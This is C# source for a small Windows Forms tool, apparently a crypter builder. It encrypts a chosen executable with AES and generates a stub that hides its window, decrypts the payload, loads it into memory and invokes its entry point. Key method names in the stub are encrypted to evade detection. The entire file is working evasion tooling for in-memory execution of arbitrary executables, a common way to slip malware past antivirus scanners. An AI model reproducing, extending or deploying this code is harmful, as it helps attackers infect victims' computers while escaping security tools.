﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Mr.Loai_Clean
{
    public partial class Form1 : Form
    {
        
        public Form1()
        {
            InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "(*.exe) | *.exe";
            openFileDialog.ShowDialog();
            TextBox1.Text = openFileDialog.FileName;

        }
        public static string AES_Encrypt(string Intext, string iKey)
        {
            AesManaged aesManaged = new AesManaged();
            MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
            byte[] key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(iKey));
            aesManaged.Key = key;
            aesManaged.Mode = CipherMode.ECB;
            byte[] bytes = Encoding.ASCII.GetBytes(Intext);
            return Convert.ToBase64String(aesManaged.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length));
        }

        private void recuperareIIButton1_Click(object sender, EventArgs e)
        {
            string fun = "//using Microsoft.VisualBasic";
            string base64 = Convert.ToBase64String(File.ReadAllBytes(TextBox1.Text));
            string z = "this.Hide();";
            string z1 = "this.Visible = false;";
            string all = AES_Encrypt(base64, TextBox2.Text);
            string z3 = "byte[] m2 = Convert.FromBase64String(AES_Decrypt("+"all ,"+ "\"" + TextBox2.Text + "\"" + "));";
            string z4 = "Object a1 = System.AppDomain.CurrentDomain.Load(m2);";
            string z5 = AES_Encrypt("EntryPoint",TextBox2.Text);
            string z6 = "object a2 = Interaction.CallByName(a1, AES_Decrypt(" + "\"" + z5 + "\"" + "," + "\"" + TextBox2.Text + "\"), CallType.Get);";
            string z7 = AES_Encrypt("Invoke", TextBox2.Text);
            string z8 = "object a3 = Interaction.CallByName(a2, AES_Decrypt(" + "\"" + z7 + "\"" + "," + "\"" + TextBox2.Text + "\"), CallType.Method, 0, null);";
            richTextBox1.Text=(fun + "\n" + z + "\n" +z1 + "\n" + "String all =" +"\""+all+"\";" + "\n" + z3 + "\n" + z4 + "\n" + z6 + "\n" + z8);


        }


        private void recuperareIIButton6_Click(object sender, EventArgs e)
        {
            if (richTextBox1.Text == "")
            {
                MessageBox.Show("No text to copy", "Error");
            }
            else {
                Clipboard.SetText(richTextBox1.Text);
            }
        }

        private void recuperareIIButton2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Coded By Mr.ŁǾẪĪ : Thanks to Rajawi", "About");
        }

        private void recuperareIIButton3_Click(object sender, EventArgs e)
        {
           richTextBox1.Text = Properties.Resources.AES_Decrypt;
        }
    }
}
